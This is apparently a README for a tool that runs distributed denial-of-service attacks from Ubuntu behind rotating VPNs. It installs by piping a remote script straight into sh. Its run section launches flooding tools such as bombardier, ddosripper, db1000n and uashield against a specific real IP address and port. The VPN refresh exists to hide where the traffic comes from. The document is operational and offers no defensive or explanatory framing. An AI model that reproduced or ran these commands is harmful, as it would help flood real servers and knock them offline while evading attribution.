# Ubuntu runner
Script runs load under vpn and refreshes vpn every N seconds

Supports many VPN providers via https://github.com/qdm12/gluetun/wiki

# Install
```
curl https://raw.githubusercontent.com/ctukraine22/runner/master/install.sh | sh
```

# Init
```
/runner/init.sh user1 code1 expressvpn Country
/runner/init.sh %vpn-user% %vpn-pass% %vpn-type% "vpn-counties" %vpn-servers% %vpn-transport% %vpn-cret-repo% %vpn-refresh-sec%
```

# Run

```
/runner/run.sh bombardier 194.58.196.62 53 
/runner/run.sh ddosripper 194.58.196.62 53 
/runner/run.sh db1000n
/runner/run.sh uashield

```
- %vpn-type% here https://github.com/qdm12/gluetun/wiki
- %vpn-transport%: tcp/udp
- "vpn-counties" %vpn-servers%: different fore each vpn provider, see wiki
- %vpn-cret-repo%: git repository which contains cert files in folder named same as %vpn-type%

To use cyberhost you need fork this repo and replace key and crt: https://github.com/qdm12/gluetun/wiki/Cyberghost

# Supported tools
- db1000n
- checksites
- ddosripper
- uashield
- bombardier
- kali